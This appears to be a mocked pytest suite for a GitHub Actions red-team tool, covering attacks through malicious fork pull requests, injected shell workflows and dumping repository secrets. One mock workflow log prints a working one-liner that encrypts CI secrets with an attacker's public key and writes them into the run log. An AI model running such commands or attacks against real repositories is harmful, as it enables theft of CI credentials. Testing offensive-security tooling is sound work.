import re

from unittest.mock import patch
from unittest.mock import MagicMock
from gato.attack import Attacker
from gato.cli import Output

output = Output(True)


# From https://stackoverflow.com/questions/14693701/
# how-can-i-remove-the-ansi-escape-sequences-from-a-string-in-python
def escape_ansi(line):
    ansi_escape = re.compile(r'(?:\x1B[@-_]|[\x80-\x9F])[0-?]*[ -/]*[@-~]')
    return ansi_escape.sub('', line)


def test_init():
    """Test constructor for enumerator.
    """

    gh_attacker = Attacker(
        
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,
        http_proxy="localhost:8080"
    )

    assert gh_attacker.http_proxy == "localhost:8080"


@patch("gato.attack.attack.time.sleep")
@patch("gato.attack.attack.Api")
@patch("gato.attack.attack.Git")
def test_fork_pr(mock_git, mock_api, mock_time, capsys):
    """Test creating a malicious fork PR
    """

    mock_api.return_value.check_user.return_value = {
        "user": 'testUser',
        "name": 'test user',
        "scopes": ['repo','workflow']
    }

    mock_api.return_value.get_recent_workflow.return_value = \
        12345

    mock_api.return_value.fork_repository.return_value = \
        'testOrg/targetRepo'
    mock_api.return_value.create_fork_pr.return_value = \
        'https://github.com/testOrg/targetRepo/pulls/12'

    mock_api.return_value.proxies = {
        "https": "http://localhost:8080"
    }

    gh_attacker = Attacker(
        
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,
        http_proxy="localhost:8080"
    )

    gh_attacker.fork_pr_attack('targetRepo', 'develop', 'Bad PR', 'attack',
                               'whoami', None, 'message')

    captured = capsys.readouterr()

    print_output = captured.out

    assert "Successfully created fork: testOrg/targetRepo" in escape_ansi(
        print_output
    )

    assert " viewed at: https://github.com/testOrg/targetRepo/pulls/12" in \
        escape_ansi(print_output)

@patch("gato.attack.attack.time.sleep")
@patch("gato.attack.attack.Api")
@patch("gato.attack.attack.Git")
def test_fork_pr_timeout(mock_git, mock_api, mock_time, capsys):
    """Test creating a malicious fork PR
    """

    mock_api.return_value.check_user.return_value = {
        "user": 'testUser',
        "name": 'test user',
        "scopes": ['repo','workflow']
    }

    mock_api.return_value.fork_repository.return_value = \
        'testOrg/targetRepo'

    mock_api.return_value.get_repository.return_value = \
        None

    mock_api.return_value.proxies = {
        "https": "http://localhost:8080"
    }

    gh_attacker = Attacker(
        
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,
        http_proxy="localhost:8080"
    )

    status = gh_attacker.fork_pr_attack(
        'targetRepo', 'develop', 'Bad PR',
        'attack', 'whoami', None, 'message'
    )

    captured = capsys.readouterr()

    print_output = captured.out

    assert status is False
    assert "Forked repository not found after 30 seconds!" in escape_ansi(
        print_output
    )

@patch("gato.attack.attack.Api")
@patch("gato.attack.attack.Git")
def test_fork_pr_perm(mock_git, mock_api, capsys):
    """Test creating a malicious fork PR
    """

    mock_api.return_value.check_user.return_value = {
        "user": 'testUser',
        "name": 'test user',
        "scopes": ['repo']
    }

    mock_api.return_value.proxies = {
        "https": "http://localhost:8080"
    }

    gh_attacker = Attacker(
        
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,
        http_proxy="localhost:8080"
    )

    gh_attacker.fork_pr_attack('targetRepo', 'develop', 'Bad PR', 'attack',
                               'whoami', None, 'message')

    captured = capsys.readouterr()

    print_output = captured.out

    assert " The user does not have the necessary scopes" in \
        escape_ansi(print_output)


@patch("gato.attack.attack.time.sleep")
@patch("gato.attack.attack.Api")
def test_shell_workflow_attack(mock_api, mock_time, capsys):
    """Test the shell workflow attack.
    """

    mock_api.return_value.check_user.return_value = {
        "user": 'testUser',
        "name": 'test user',
        "scopes": ['repo', 'workflow']
    }

    mock_api.return_value.proxies = {
        "https": "http://localhost:8080"
    }

    mock_api.return_value.create_branch.return_value = True
    mock_api.return_value.commit_file.return_value = \
        "8933f8abb60e4e02ae1b8dd3f109bc7b6812e54f"
    mock_api.return_value.get_recent_workflow.return_value = 1
    mock_api.return_value.get_workflow_status.return_value = 1
    mock_api.return_value.delete_branch.return_value = True

    gh_attacker = Attacker(
        
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,
        http_proxy="localhost:8080"
    )

    gh_attacker.shell_workflow_attack('targetRepo', 'whoami', None, None,
                                      'message', True)

    captured = capsys.readouterr()

    print_output = captured.out

    assert "Workflow logs downloaded to" in escape_ansi(print_output)
    assert "Workflow still incomplete but hit timeout!" not in \
        escape_ansi(print_output)


@patch("gato.attack.attack.Api")
def test_shell_workflow_attack_perm(mock_api, capsys):
    """Test executing shell workflow attack with invalid permissions.
    """

    mock_api.return_value.check_user.return_value = {
        "user": 'testUser',
        "name": 'test user',
        "scopes": ['repo']
    }

    mock_api.return_value.proxies = {
        "https": "http://localhost:8080"
    }

    gh_attacker = Attacker(
        
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,
        http_proxy="localhost:8080"
    )

    gh_attacker.shell_workflow_attack('targetRepo', 'whoami', None, None,
                                      'message', False)

    captured = capsys.readouterr()

    print_output = captured.out

    assert " The user does not have the necessary scopes" in \
        escape_ansi(print_output)


@patch("gato.attack.attack.time.sleep")
@patch("gato.attack.attack.Api")
def test_shell_workflow_attack_fail_wf(mock_api, mock_time, capsys):
    """Test the shell workflow attack.
    """

    mock_api.return_value.check_user.return_value = {
        "user": 'testUser',
        "name": 'test user',
        "scopes": ['repo', 'workflow']
    }

    mock_api.return_value.proxies = {
        "https": "http://localhost:8080"
    }

    mock_api.return_value.create_branch.return_value = True
    mock_api.return_value.commit_file.return_value = \
        "8933f8abb60e4e02ae1b8dd3f109bc7b6812e54f"
    mock_api.return_value.get_recent_workflow.return_value = -1
    mock_api.return_value.get_workflow_status.return_value = 0
    mock_api.return_value.delete_branch.return_value = True

    gh_attacker = Attacker(
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,
        http_proxy="localhost:8080"
    )

    gh_attacker.shell_workflow_attack('targetRepo', 'whoami', None, None,
                                      'message', True)

    captured = capsys.readouterr()

    print_output = captured.out

    assert "Failed to find the created workflow!" in escape_ansi(print_output)


@patch("gato.attack.attack.time.sleep")
@patch("gato.attack.attack.Api")
def test_shell_workflow_attack_fail_timeout(mock_api, mock_time, capsys):
    """Test the shell workflow attack.
    """

    mock_api.return_value.check_user.return_value = {
        "user": 'testUser',
        "name": 'test user',
        "scopes": ['repo', 'workflow']
    }

    mock_api.return_value.proxies = {
        "https": "http://localhost:8080"
    }

    mock_api.return_value.create_branch.return_value = True
    mock_api.return_value.commit_file.return_value = \
        "8933f8abb60e4e02ae1b8dd3f109bc7b6812e54f"
    mock_api.return_value.get_recent_workflow.return_value = 0
    mock_api.return_value.get_workflow_status.return_value = 0
    mock_api.return_value.delete_branch.return_value = True

    gh_attacker = Attacker(
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,
        http_proxy="localhost:8080"
    )

    gh_attacker.shell_workflow_attack('targetRepo', 'whoami', None, None,
                                      'message', True)

    captured = capsys.readouterr()

    print_output = captured.out

    assert "Failed to find the created workflow!" in escape_ansi(print_output)


@patch("gato.attack.attack.time.sleep")
@patch("gato.attack.attack.Api")
def test_shell_workflow_attack_fail_timeout2(mock_api, mock_time, capsys):
    """Test the shell workflow attack.
    """

    mock_api.return_value.check_user.return_value = {
        "user": 'testUser',
        "name": 'test user',
        "scopes": ['repo', 'workflow']
    }

    mock_api.return_value.proxies = {
        "https": "http://localhost:8080"
    }

    mock_api.return_value.create_branch.return_value = True
    mock_api.return_value.commit_file.return_value = \
        "8933f8abb60e4e02ae1b8dd3f109bc7b6812e54f"
    mock_api.return_value.get_recent_workflow.return_value = 1
    mock_api.return_value.get_workflow_status.return_value = 0
    mock_api.return_value.delete_branch.return_value = True

    gh_attacker = Attacker(
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,
        http_proxy="localhost:8080"
    )

    gh_attacker.shell_workflow_attack('targetRepo', 'whoami', None, None,
                                      'message', True)

    captured = capsys.readouterr()

    print_output = captured.out

    assert "The workflow is incomplete but hit the timeout" in escape_ansi(print_output)


@patch("gato.attack.attack.time.sleep")
@patch("gato.attack.attack.Api")
def test_shell_workflow_attack_fail_branch(mock_api, mock_time, capsys):
    """Test the shell workflow attack.
    """

    mock_api.return_value.check_user.return_value = {
        "user": 'testUser',
        "name": 'test user',
        "scopes": ['repo', 'workflow']
    }

    mock_api.return_value.proxies = {
        "https": "http://localhost:8080"
    }

    mock_api.return_value.get_repo_branch.return_value = -1

    gh_attacker = Attacker(
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,
        http_proxy="localhost:8080"
    )

    gh_attacker.shell_workflow_attack('targetRepo', 'whoami', None, None,
                                      'message', True)

    captured = capsys.readouterr()

    print_output = captured.out

    assert "Failed to check for remote branch!" in escape_ansi(print_output)


@patch("gato.attack.attack.time.sleep")
@patch("gato.attack.attack.Api")
def test_shell_workflow_attack_fail_branch2(mock_api, mock_time, capsys):
    """Test the shell workflow attack.
    """

    mock_api.return_value.check_user.return_value = {
        "user": 'testUser',
        "name": 'test user',
        "scopes": ['repo', 'workflow']
    }

    mock_api.return_value.proxies = {
        "https": "http://localhost:8080"
    }

    mock_api.return_value.get_repo_branch.return_value = 1

    gh_attacker = Attacker(
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,
        http_proxy="localhost:8080"
    )

    gh_attacker.shell_workflow_attack('targetRepo', 'whoami', None, None,
                                      'message', True)

    captured = capsys.readouterr()

    print_output = captured.out

    assert "Remote branch, " in escape_ansi(print_output)
    assert ", already exists!" in escape_ansi(print_output)

@patch("gato.attack.attack.Attacker._Attacker__decrypt_secrets")
@patch("gato.attack.attack.Attacker._Attacker__create_private_key")
@patch("gato.attack.attack.Api")
def test_secrets_dump(mock_api, mock_privkey, mock_dec, capsys):
    """Test secrets dump functionality.
    """
    mock_api.return_value.check_user.return_value = {
        "user": 'testUser',
        "name": 'test user',
        "scopes": ['repo', 'workflow']
    }
    mock_api.return_value.get_secrets.return_value = [{
        "name": "TEST_SECRET"
    }]
    mock_api.return_value.get_repo_org_secrets.return_value = []
    mock_api.return_value.get_repo_branch.return_value = 0
    pub_mock = """
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAuA+sy+VjSRn+2irScEhy
UmS2fwJvBszSTjmS1RS1pDguC2gL0DxasqPdw3vHAzeIArvxg1+IJTthvJX3Ji+7
8YoI2gd7J7eKCD2NbdONrBNKqvj8CJUA4nY4BEbpP3zkThRb0fWyVJktCy+bgmS5
Lo7M/sS7urnh55onw9RwL9ETdWj7W2LdgfgF85DVervaJxrSTMdXVJWAzUiIwWTK
fNBiJ0n3Be1NTc6Q4U8ElI2yKp/Dgl7RfLp/FVAgPh6ARzelaCMqJRLW7Wojh5ik
1pKoJiWqLKUwjLX1IU5Xtnf5PDMSMXv0ytFAop0KCV3sJDZeo40bMmO3tijp0+2x
W0vTeApmhYliYKpeqDWi3tm6Je/aYmZQwVlLHmv/U0UyXk7MYI2g5K8MhlGZcIed
spS/Bmt9h87EyaA+dGbqUssk3PAPhDcT9qJ9bOtuCl/MwEF3G4rE0lvJdk82MP17
SymVapDpPHqlCOXpRJlZ3izm1eT4VzS9IAje/1qZdbGS0XsRbYswAhyaV6uyj3rk
9mDboT7sVz+qzpmeNzD8BoQw3N1fUEwnagag4Z5DCrHwvPK9qr+1kNzYbMf5np88
eLxB/rMtfZCjliw1O0DzkkAvH+HnCgufX594EJsr0LLYF6JasVtWM79EGqJaI5mF
w1M8xrm+PUM5qaWCANScuX8CAwEAAQ==
-----END PUBLIC KEY-----
    """

    mock_api.return_value.retrieve_workflow_log.return_value = """
2023-11-19T17:50:28.8652359Z ##[group]Run openssl rand -out sym.key 32; echo -n '$';echo -e "DUMMY_TEST_SECRET=$DUMMY_TEST_SECRET \n" | openssl enc -aes-256-cbc -kfile sym.key -pbkdf2 | base64 -w 0 | tr -d '\n';echo '$'; echo -n '$'; cat sym.key | base64 | openssl rsautl -encrypt -inkey <(echo "$exfil_branch_KEY") -pubin -pkcs | base64 -w 0 | tr -d '\n'; echo '$'
2023-11-19T17:50:28.8658392Z openssl rand -out sym.key 32; echo -n '$';echo -e "DUMMY_TEST_SECRET=$DUMMY_TEST_SECRET \n" | openssl enc -aes-256-cbc -kfile sym.key -pbkdf2 | base64 -w 0 | tr -d '\n';echo '$'; echo -n '$'; cat sym.key | base64 | openssl rsautl -encrypt -inkey <(echo "$exfil_branch_KEY") -pubin -pkcs | base64 -w 0 | tr -d '\n'; echo '$'
2023-11-19T17:50:28.9235227Z shell: /usr/bin/bash -e {0}
2023-11-19T17:50:28.9235996Z env:
2023-11-19T17:50:28.9237065Z   DUMMY_TEST_SECRET: ***
2023-11-19T17:50:28.9246938Z   exfil_branch_KEY: -----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAuA+sy+VjSRn+2irScEhy
UmS2fwJvBszSTjmS1RS1pDguC2gL0DxasqPdw3vHAzeIArvxg1+IJTthvJX3Ji+7
8YoI2gd7J7eKCD2NbdONrBNKqvj8CJUA4nY4BEbpP3zkThRb0fWyVJktCy+bgmS5
Lo7M/sS7urnh55onw9RwL9ETdWj7W2LdgfgF85DVervaJxrSTMdXVJWAzUiIwWTK
fNBiJ0n3Be1NTc6Q4U8ElI2yKp/Dgl7RfLp/FVAgPh6ARzelaCMqJRLW7Wojh5ik
1pKoJiWqLKUwjLX1IU5Xtnf5PDMSMXv0ytFAop0KCV3sJDZeo40bMmO3tijp0+2x
W0vTeApmhYliYKpeqDWi3tm6Je/aYmZQwVlLHmv/U0UyXk7MYI2g5K8MhlGZcIed
spS/Bmt9h87EyaA+dGbqUssk3PAPhDcT9qJ9bOtuCl/MwEF3G4rE0lvJdk82MP17
SymVapDpPHqlCOXpRJlZ3izm1eT4VzS9IAje/1qZdbGS0XsRbYswAhyaV6uyj3rk
9mDboT7sVz+qzpmeNzD8BoQw3N1fUEwnagag4Z5DCrHwvPK9qr+1kNzYbMf5np88
eLxB/rMtfZCjliw1O0DzkkAvH+HnCgufX594EJsr0LLYF6JasVtWM79EGqJaI5mF
w1M8xrm+PUM5qaWCANScuX8CAwEAAQ==
-----END PUBLIC KEY-----

2023-11-19T17:50:28.9257476Z ##[endgroup]
2023-11-19T17:50:29.0161347Z $U2FsdGVkX19CMUoVv3wYfGZJ7Ze4OVcaniYI0s3HBMtS6btWIilFyw6Jz0jeSeDoswjfQgDw6YOww/LVEA4mpg==$
2023-11-19T17:50:29.0170781Z The command rsautl was deprecated in version 3.0. Use 'pkeyutl' instead.
2023-11-19T17:50:29.0219145Z $Mgbsrj2aSx2BWPJIPVZLFN9kqFaHfMYAgdDJL0BSnFnd/vZvk1dy4xy0yCKJq3ewbOC+ZLZ1BC6fAVIu69Nir/rfgsAPx1xSX9BPRpe+d2jszXK8/QSSvqJrskF0zyAMRwYlajHQNk958ReDscUdekaVRv1O1KiVKmQ94sfXN+NXLsL9TirGKFswcxDyY7BxfOEtlRhcxlm1oPXlKGQrAaOk6LVaKhhz7TjvFQ8dNRddHDxVZ1vVVQjC0GH6f2gBAlcfniPlAmEoNMEbeC8Kxx5j86QqllVQqUUpJvUc2b5Ue/Rqmt59ujsaQEj5xddk1g9cKByhDONTO7u6aUX9gU2LPqUqNKQf5U+2JAJV32tOOlCoHqnjNVchk9zOn/0jev5yl4aFz1GDS2NV+NsiG1OxVdIctkrLmwMK3xJLxrwjFnA9mRAbiy3F2a91KjLT9NMxjs74yzHe91+SOG7S55kdnmpqi1sVOKrH4fyrJIavSt6d6Y3ETWeVN2OrXlPKuIga8jCVAUgb1HN9TQxGfQ3I2Cs9X30CTt0tfxfqd+qy0tv/JQbvRwLOmN6n0Greo8eXhsraVJP5TrObnTvcJTwp6nVNHG9dUKXPVVToeAsSyZN5mR4scR4cyJS3P5v8BEKMlue+s7lvLRZ0RmOvm/31+K/rc0z2CRD7sWxDZNg=$
    """
    mock_api.return_value.get_recent_workflow.return_value = 11111111
    mock_api.return_value.get_workflow_status.return_value = 1
    mock_priv = MagicMock()
    mock_priv.decrypt.return_value = "TestSymKey"
    mock_privkey.return_value = (mock_priv, "pub_mock")
    mock_dec.return_value = b"DUMMY_TEST_SECRET=TEST_SECRET_VALUE"


    gh_attacker = Attacker(
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,
        http_proxy="localhost:8080"
    )

    gh_attacker.secrets_dump('targetRepo', None, None, True, "exfil")

    captured = capsys.readouterr()

    print_output = captured.out

    assert "Decrypted and Decoded Secrets:" in \
        escape_ansi(print_output)


@patch("gato.attack.attack.Api")
def test_secrets_dump_baduser(mock_api, capsys):
    """Test secrets dump functionality with bad permissions.
    """
    mock_api.return_value.check_user.return_value = {
        "user": 'testUser',
        "name": 'test user',
        "scopes": ['repo']
    }

    gh_attacker = Attacker(
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,
        http_proxy="localhost:8080"
    )

    gh_attacker.secrets_dump('targetRepo', None, None, True, "exfil")

    captured = capsys.readouterr()

    print_output = captured.out

    assert "The user does not have the necessary scopes to conduct this" in \
        escape_ansi(print_output)

@patch("gato.attack.attack.Api")
def test_secrets_dump_nosecret(mock_api, capsys):
    """Test secrets dump where repo has no secrets.
    """

    mock_api.return_value.check_user.return_value = {
        "user": 'testUser',
        "name": 'test user',
        "scopes": ['repo', 'workflow']
    }

    mock_api.return_value.get_secrets.return_value = []
    mock_api.return_value.get_repo_org_secrets.return_value = []

    gh_attacker = Attacker(
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,   
        http_proxy="localhost:8080"
    )

    gh_attacker.secrets_dump('targetRepo', None, None, True, "exfil")

    captured = capsys.readouterr()
    print_output = captured.out

    assert "The repository does not have any accessible secrets" in \
        escape_ansi(print_output)

@patch("gato.attack.attack.Api")
def test_secrets_dump_branchexist(mock_api, capsys):
    """Test secrets dump where exfil branch already exists.
    """

    mock_api.return_value.check_user.return_value = {
        "user": 'testUser',
        "name": 'test user',
        "scopes": ['repo', 'workflow']
    }

    mock_api.return_value.get_secrets.return_value = [{
        "name": "TEST_SECRET"
    }]
    mock_api.return_value.get_repo_org_secrets.return_value = []
    mock_api.return_value.get_repo_branch.return_value = 1

    gh_attacker = Attacker(
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,   
        http_proxy="localhost:8080"
    )

    gh_attacker.secrets_dump('targetRepo', "exfilbranch", None, True, "exfil")

    captured = capsys.readouterr()
    print_output = captured.out

    assert "Remote branch, exfilbranch, already exists!" in \
        escape_ansi(print_output)

@patch("gato.attack.attack.Api")
def test_secrets_dump_branchfail(mock_api, capsys):
    """Test secrets dump where branch check fails.
    """

    mock_api.return_value.check_user.return_value = {
        "user": 'testUser',
        "name": 'test user',
        "scopes": ['repo', 'workflow']
    }

    mock_api.return_value.get_secrets.return_value = [{
        "name": "TEST_SECRET"
    }]
    mock_api.return_value.get_repo_org_secrets.return_value = []
    mock_api.return_value.get_repo_branch.return_value = -1

    gh_attacker = Attacker(
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,   
        http_proxy="localhost:8080"
    )

    gh_attacker.secrets_dump('targetRepo', "exfilbranch", None, True, "exfil")

    captured = capsys.readouterr()
    print_output = captured.out

    assert "Failed to check for remote branch!" in \
        escape_ansi(print_output)
